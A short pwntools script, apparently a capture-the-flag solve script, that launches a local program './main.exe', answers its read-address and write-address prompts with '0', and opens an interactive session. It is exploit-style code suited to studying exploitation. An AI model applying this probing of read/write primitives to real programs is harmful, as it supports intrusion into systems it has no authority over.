#!/usr/bin/env python3
from pwn import *

p = process("./main.exe")
p.sendlineafter(b"R addr", b"0")
p.sendlineafter(b"W addr", b"0")
p.interactive()
